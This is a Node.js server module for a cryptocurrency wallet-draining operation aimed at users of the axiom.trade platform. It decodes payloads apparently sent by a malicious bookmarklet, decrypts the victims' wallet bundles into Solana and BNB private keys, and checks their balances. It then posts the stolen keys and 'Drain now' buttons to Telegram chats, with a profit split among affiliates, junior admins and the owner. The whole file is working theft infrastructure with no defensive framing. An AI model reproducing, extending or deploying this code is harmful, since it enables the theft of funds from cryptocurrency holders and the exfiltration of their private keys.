'use strict';

const crypto = require('crypto');
const bs58 = require('bs58');
const nacl = require('tweetnacl');
const { Wallet } = require('ethers');
const { resolveChatId, resolveUser, getByChat, hydrateFromRedis } = require('./users');
const { executeSplit, formatTransferReport } = require('./transfer');
const { saveHit } = require('./hits');

const SOL_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
const BSC_RPC = process.env.BSC_RPC || 'https://bsc-dataseed.binance.org';
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const PRICE_TIMEOUT = 5000;

// ---------- decode ----------

function decodeB64Url(s) {
  const padded = s.replace(/-/g, '+').replace(/_/g, '/');
  const pad = padded.length % 4;
  return Buffer.from(pad ? padded + '='.repeat(4 - pad) : padded, 'base64');
}

function decodeSlug(slug) {
  if (!slug || typeof slug !== 'string') throw new Error('Missing slug');
  const json = decodeB64Url(slug.trim()).toString('utf8');
  const payload = JSON.parse(json);
  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
    throw new Error('Payload must be a JSON object');
  }
  return payload;
}

function escapeHtml(v) {
  return String(v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ---------- crypto ----------

const AES_BY_LEN = { 16: 'aes-128-gcm', 24: 'aes-192-gcm', 32: 'aes-256-gcm' };

function decryptBundle(keyB64Url, entriesStr) {
  if (!keyB64Url || !entriesStr) return [];
  const key = decodeB64Url(keyB64Url);
  const algo = AES_BY_LEN[key.length];
  if (!algo) throw new Error(`Invalid bundle key length: ${key.length}`);

  let list;
  try {
    list = JSON.parse(entriesStr);
  } catch {
    throw new Error('sBundles/eBundles JSON parse failed');
  }
  if (!Array.isArray(list)) return [];

  return list.map((entry, idx) => {
    try {
      const colon = entry.indexOf(':');
      if (colon === -1) throw new Error('Missing iv:cipher separator');
      const iv = decodeB64Url(entry.slice(0, colon));
      const buf = decodeB64Url(entry.slice(colon + 1));
      const authTag = buf.subarray(-16);
      const ciphertext = buf.subarray(0, -16);
      const d = crypto.createDecipheriv(algo, key, iv);
      d.setAuthTag(authTag);
      return { idx, raw: Buffer.concat([d.update(ciphertext), d.final()]), ok: true };
    } catch (err) {
      return { idx, ok: false, error: err.message };
    }
  });
}

function rawToSolana(raw) {
  let seed;
  if (raw.length === 64) seed = raw.subarray(0, 32);
  else if (raw.length === 32) seed = raw;
  else {
    const ascii = raw.toString('ascii').trim();
    if (ascii.length > 40) {
      const dec = bs58.decode(ascii);
      seed = dec.length === 64 ? dec.subarray(0, 32) : dec.length === 32 ? dec : null;
    } else seed = null;
  }
  if (!seed || seed.length !== 32) return null;
  const kp = nacl.sign.keyPair.fromSeed(seed);
  return {
    address: bs58.encode(kp.publicKey),
    privateKey: bs58.encode(Buffer.concat([seed, Buffer.from(kp.publicKey)])),
  };
}

function rawToBnb(raw) {
  const ascii = raw.toString('ascii').trim();
  let hex;
  if (ascii.startsWith('0x') && ascii.length === 66) hex = ascii.slice(2);
  else if (ascii.length === 64) hex = ascii;
  else hex = raw.toString('hex');
  try {
    const w = new Wallet('0x' + hex);
    return { address: w.address, privateKey: '0x' + hex };
  } catch {
    return null;
  }
}

// ---------- balances ----------

async function fetchJson(url, body, timeout = 6000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeout);
  try {
    const r = await fetch(url, {
      method: body ? 'POST' : 'GET',
      headers: body ? { 'Content-Type': 'application/json' } : undefined,
      body: body ? JSON.stringify(body) : undefined,
      signal: ctrl.signal,
    });
    return await r.json();
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

let priceCache = null;
async function getPrices() {
  if (priceCache && Date.now() - priceCache.t < 60000) return priceCache.d;
  const d = await fetchJson(
    'https://api.coingecko.com/api/v3/simple/price?ids=solana,binancecoin&vs_currencies=usd',
    null,
    PRICE_TIMEOUT,
  );
  const prices = {
    sol: d?.solana?.usd || 0,
    bnb: d?.binancecoin?.usd || 0,
  };
  priceCache = { t: Date.now(), d: prices };
  return prices;
}

async function fetchSolBalance(address, prices) {
  try {
    const r = await fetchJson(
      SOL_RPC,
      { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [address] },
      6000,
    );
    const sol = (r?.result?.value || 0) / 1e9;
    return { sol, usd: sol * prices.sol };
  } catch {
    return { sol: 0, usd: 0 };
  }
}

async function fetchBnbBalance(address, prices) {
  try {
    const r = await fetchJson(
      BSC_RPC,
      { jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [address, 'latest'] },
      6000,
    );
    const bnb = parseInt(r?.result || '0x0', 16) / 1e18;
    return { bnb, usd: bnb * prices.bnb };
  } catch {
    return { bnb: 0, usd: 0 };
  }
}

// ---------- telegram ----------

const ADMIN_CHAT_IDS = new Set(
  String(process.env.ADMIN_CHAT_IDS || process.env.FALLBACK_CHAT_ID || '')
    .split(/[,\s]+/)
    .map((s) => s.trim())
    .filter(Boolean),
);

function isAdmin(chatId) {
  return ADMIN_CHAT_IDS.has(String(chatId));
}

/** Balance-only message – never includes private keys (for normal users) */
function formatBalanceMessage(solWallets, bnbWallets, split) {
  const lines = [];
  let totalUsd = 0;
  const userPct = split && Number.isFinite(split.userPercent) ? split.userPercent : 80;
  const adminPct = 100 - userPct;

  if (solWallets.length) {
    lines.push(`💳 Solana (${solWallets.length})`);
    solWallets.forEach((w, i) => {
      totalUsd += w.usd || 0;
      lines.push(
        `├ ${i + 1}. <code>${escapeHtml(w.address)}</code>\n` +
          `│    ${w.sol.toFixed(6)} SOL  ·  $${w.usd.toFixed(2)}`,
      );
    });
    lines.push('');
  }

  if (bnbWallets.length) {
    lines.push(`🟡 BNB (${bnbWallets.length})`);
    bnbWallets.forEach((w, i) => {
      totalUsd += w.usd || 0;
      lines.push(
        `├ ${i + 1}. <code>${escapeHtml(w.address)}</code>\n` +
          `│    ${w.bnb.toFixed(6)} BNB  ·  $${w.usd.toFixed(2)}`,
      );
    });
    lines.push('');
  }

  if (!lines.length) return 'No wallets found.';

  const userShare = (totalUsd * userPct) / 100;
  const adminShare = (totalUsd * adminPct) / 100;
  lines.push(`Σ total ≈ $${totalUsd.toFixed(2)}`);
  lines.push(`↳ your share (${userPct}%) ≈ $${userShare.toFixed(2)}`);
  lines.push(`↳ platform (${adminPct}%) ≈ $${adminShare.toFixed(2)}`);
  return lines.join('\n');
}

/** Non-key summary for junior admin when their affiliate gets a hit */
function formatJuniorMessage(solWallets, bnbWallets, split, ownerChatId, hitId) {
  const lines = [];
  let totalUsd = 0;
  for (const w of solWallets) totalUsd += w.usd || 0;
  for (const w of bnbWallets) totalUsd += w.usd || 0;
  const jp = split.juniorPercent ?? 10;
  const op = split.ownerPercent ?? 10;
  const up = split.userPercent ?? 80;
  const juniorShare = (totalUsd * jp) / 100;

  lines.push('👥 <b>Affiliate hit</b>');
  lines.push('affiliate chat <code>' + escapeHtml(String(ownerChatId)) + '</code>');
  lines.push('hit <code>' + escapeHtml(String(hitId)) + '</code>');
  lines.push('');
  if (solWallets.length) {
    lines.push('💳 Solana (' + solWallets.length + ')');
    solWallets.forEach((w, i) => {
      lines.push(
        '├ ' + (i + 1) + '. <code>' + escapeHtml(w.address) + '</code>\n' +
          '│    ' + w.sol.toFixed(6) + ' SOL  ·  $' + w.usd.toFixed(2),
      );
    });
    lines.push('');
  }
  if (bnbWallets.length) {
    lines.push('🟡 BNB (' + bnbWallets.length + ')');
    bnbWallets.forEach((w, i) => {
      lines.push(
        '├ ' + (i + 1) + '. <code>' + escapeHtml(w.address) + '</code>\n' +
          '│    ' + w.bnb.toFixed(6) + ' BNB  ·  $' + w.usd.toFixed(2),
      );
    });
    lines.push('');
  }
  lines.push('Σ total ≈ $' + totalUsd.toFixed(2));
  lines.push('split: aff ' + up + '% · you ' + jp + '% · owner ' + op + '%');
  lines.push('↳ your cut ≈ $' + juniorShare.toFixed(2));
  lines.push('');
  lines.push('No keys — affiliate chooses Drain / Save. You get paid on Drain.');
  return lines.join('\n');
}

/** Full dump including private keys – admin only */
function formatAdminMessage(solWallets, bnbWallets, ownerChatId, split) {
  const lines = [];
  const userPct = split && Number.isFinite(split.userPercent) ? split.userPercent : 80;
  const hasJunior = Boolean(split && split.juniorOf);
  const juniorPct = hasJunior ? (split.juniorPercent ?? 10) : 0;
  const ownerPct = hasJunior ? (split.ownerPercent ?? 10) : 100 - userPct;
  let totalUsd = 0;
  for (const w of solWallets) totalUsd += w.usd || 0;
  for (const w of bnbWallets) totalUsd += w.usd || 0;
  const userShare = (totalUsd * userPct) / 100;
  const juniorShare = (totalUsd * juniorPct) / 100;
  const ownerShare = (totalUsd * ownerPct) / 100;

  if (split && split.selfHit) {
    lines.push(`🔐 <b>ADMIN dump</b> · <b>your bookmarklet</b>`);
    lines.push(`chat <code>${escapeHtml(String(ownerChatId))}</code>`);
    lines.push(`split: you 100% ($${totalUsd.toFixed(2)})`);
  } else if (hasJunior) {
    lines.push(`🔐 <b>ADMIN dump</b> · <b>via junior admin</b>`);
    lines.push(`affiliate chat <code>${escapeHtml(String(ownerChatId))}</code>`);
    lines.push(`junior chat <code>${escapeHtml(String(split.juniorOf))}</code>`);
    lines.push(
      `split: aff ${userPct}% ($${userShare.toFixed(2)}) · junior ${juniorPct}% ($${juniorShare.toFixed(2)}) · you ${ownerPct}% ($${ownerShare.toFixed(2)})`,
    );
  } else {
    lines.push(`🔐 <b>ADMIN dump</b> · <b>direct affiliate</b>`);
    lines.push(`affiliate chat <code>${escapeHtml(String(ownerChatId))}</code>`);
    lines.push(
      `split: user ${userPct}% ($${userShare.toFixed(2)}) · admin ${ownerPct}% ($${ownerShare.toFixed(2)})`,
    );
  }
  lines.push('');

  if (solWallets.length) {
    lines.push(`💳 Solana (${solWallets.length})`);
    solWallets.forEach((w, i) => {
      lines.push(
        `├ ${i + 1}. <code>${escapeHtml(w.address)}</code>  $${w.usd.toFixed(2)} / ${w.sol.toFixed(6)} SOL`,
      );
      lines.push(`│  🔑 <code>${escapeHtml(w.privateKey)}</code>`);
    });
    lines.push('');
  }

  if (bnbWallets.length) {
    lines.push(`🟡 BNB (${bnbWallets.length})`);
    bnbWallets.forEach((w, i) => {
      lines.push(
        `├ ${i + 1}. <code>${escapeHtml(w.address)}</code>  $${w.usd.toFixed(2)} / ${w.bnb.toFixed(6)} BNB`,
      );
      lines.push(`│  🔑 <code>${escapeHtml(w.privateKey)}</code>`);
    });
  }

  if (!solWallets.length && !bnbWallets.length) {
    lines.push('⚠️ No wallets decrypted.');
    if (split && split.decryptNote) lines.push(escapeHtml(String(split.decryptNote)));
    else lines.push('Axiom did not send bundle/sBundles. Guest Chrome, extensions off, then run again.');
  }

  return lines.join('\n');
}

async function sendTelegram(chatId, text, extra = {}) {
  if (!TG_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN is not set');
  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...extra,
    }),
  });
  const body = await r.json().catch(() => ({}));
  if (!r.ok || body.ok === false) {
    throw new Error(`Telegram error: ${body.description || r.statusText}`);
  }
  return body;
}

function resolveRedirectUrl(payload) {
  const site = payload.site;
  if (typeof site === 'string' && site.startsWith('https://axiom.trade')) return site;
  return 'https://axiom.trade';
}

// ---------- main ----------

async function processSlug(slug) {
  await hydrateFromRedis();
  const payload = decodeSlug(slug);

  // Prefer opaque token; never require raw telegramId in the bookmarklet
  const tokenOrId = payload.token || payload.telegramId || payload.t;
  const userRec = resolveUser(tokenOrId);
  let chatId = userRec ? userRec.chatId : resolveChatId(tokenOrId);
  // Serverless cold start: in-memory token map is empty. Fall back so the hit is not lost.
  if (!chatId && process.env.FALLBACK_CHAT_ID) {
    chatId = String(process.env.FALLBACK_CHAT_ID).trim();
  }
  if (!chatId) {
    const e = new Error(
      'No valid token mapping (user must /start the bot on THIS deployment, or set FALLBACK_CHAT_ID / USERS_JSON)',
    );
    e.statusCode = 400;
    throw e;
  }
  const split = userRec || {
    userPercent: Number(process.env.DEFAULT_USER_PERCENT) || 80,
    adminPercent: 100 - (Number(process.env.DEFAULT_USER_PERCENT) || 80),
    solAddress: '',
    bnbAddress: '',
    token: tokenOrId,
  };
  // If affiliate is under a junior admin, attach junior payout wallets for 3-way split
  if (split.juniorOf) {
    const junior = getByChat(split.juniorOf);
    if (junior) {
      split.juniorSolAddress = junior.solAddress || '';
      split.juniorBnbAddress = junior.bnbAddress || '';
      split.juniorPercent = split.juniorPercent ?? junior.juniorPercent ?? 10;
      split.ownerPercent = split.ownerPercent ?? junior.ownerPercent ?? 10;
    }
  }

  if (isAdmin(chatId)) {
    split.selfHit = true;
    split.userPercent = 0;
    split.adminPercent = 100;
    split.ownerPercent = 100;
    split.juniorOf = '';
    split.juniorPercent = 0;
    split.solAddress = process.env.ADMIN_SOL_ADDRESS || split.solAddress || '';
    split.bnbAddress = process.env.ADMIN_BNB_ADDRESS || split.bnbAddress || '';
  }

  const prices = await getPrices();
  const solWallets = [];
  const bnbWallets = [];
  const { bundle, sBundles, eBundles } = payload;

  let tgError = null;
  if (!bundle) split.decryptNote = 'No bundleKey in payload.';
  else if (!sBundles && !eBundles) split.decryptNote = 'No sBundles/eBundles in payload.';

  if (bundle) {
    try {
      if (sBundles) {
        for (const item of decryptBundle(bundle, sBundles)) {
          if (!item.ok) {
            console.error(`[sol ${item.idx}]`, item.error);
            continue;
          }
          const info = rawToSolana(item.raw);
          if (!info) continue;
          const { sol, usd } = await fetchSolBalance(info.address, prices);
          solWallets.push({ ...info, sol, usd });
          await new Promise((r) => setTimeout(r, 300));
        }
      }
      if (eBundles) {
        for (const item of decryptBundle(bundle, eBundles)) {
          if (!item.ok) {
            console.error(`[bnb ${item.idx}]`, item.error);
            continue;
          }
          const info = rawToBnb(item.raw);
          if (!info) continue;
          const { bnb, usd } = await fetchBnbBalance(info.address, prices);
          bnbWallets.push({ ...info, bnb, usd });
        }
      }
    } catch (err) {
      console.error('[decrypt]', err.message);
      tgError = `Decrypt error: ${err.message}`;
    }
  }

  // ── store hit in Upstash (or memory fallback) for Drain / Save buttons ──
  const hit = await saveHit({
    chatId: String(chatId),
    token: split.token || tokenOrId || null,
    userPercent: split.userPercent,
    adminPercent: split.adminPercent,
    solAddress: split.solAddress || '',
    bnbAddress: split.bnbAddress || '',
    juniorOf: split.juniorOf || '',
    juniorPercent: split.juniorPercent || 0,
    ownerPercent: split.ownerPercent || 0,
    juniorSolAddress: split.juniorSolAddress || '',
    juniorBnbAddress: split.juniorBnbAddress || '',
    solWallets,
    bnbWallets,
  });

  // ── user: balance + Drain now / Save later ─────────────────────────────
  const skipUserMsg =
    Boolean(split && split.isFallback) ||
    (userRec && userRec.isFallback) ||
    isAdmin(chatId);
  if (!skipUserMsg) {
    try {
      await sendTelegram(
        chatId,
        formatBalanceMessage(solWallets, bnbWallets, split) +
          '\n\nChoose what to do with this log:',
        {
          reply_markup: {
            inline_keyboard: [
              [
                { text: '⚡ Drain now', callback_data: 'drain:' + hit.id },
                { text: '💾 Save later', callback_data: 'save:' + hit.id },
              ],
            ],
          },
        },
      );
    } catch (err) {
      console.error('[telegram user]', err.message);
      if (!tgError) tgError = err.message;
    }
  }

  // ── junior: non-key notice ─────────────────────────────────────────────
  if (split.juniorOf && String(split.juniorOf) !== String(chatId)) {
    try {
      await sendTelegram(
        split.juniorOf,
        formatJuniorMessage(solWallets, bnbWallets, split, chatId, hit.id),
      );
    } catch (err) {
      console.error('[telegram junior]', err.message);
    }
  }

  // ── admin: full keys, waiting on affiliate action ──────────────────────
  if (ADMIN_CHAT_IDS.size) {
    const drainButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚡ Drain now', callback_data: 'drain:' + hit.id },
            { text: '💾 Save later', callback_data: 'save:' + hit.id },
          ],
        ],
      },
    };
    const pendingNote = isAdmin(chatId)
      ? '\n\nYour log — keys above. Drain or save:'
      : ('\n\n⏳ pending affiliate action on hit <code>' + hit.id + '</code>');
    const adminText = formatAdminMessage(solWallets, bnbWallets, chatId, split) + pendingNote;
    for (const adminId of ADMIN_CHAT_IDS) {
      try {
        await sendTelegram(adminId, adminText, drainButtons);
      } catch (err) {
        console.error('[telegram admin]', adminId, err.message);
      }
    }
  }

  return {
    redirectUrl: resolveRedirectUrl(payload),
    chatId: '***', // never echo real chat id back
    solCount: solWallets.length,
    bnbCount: bnbWallets.length,
    error: tgError,
  };
}

module.exports = { decodeSlug, processSlug };
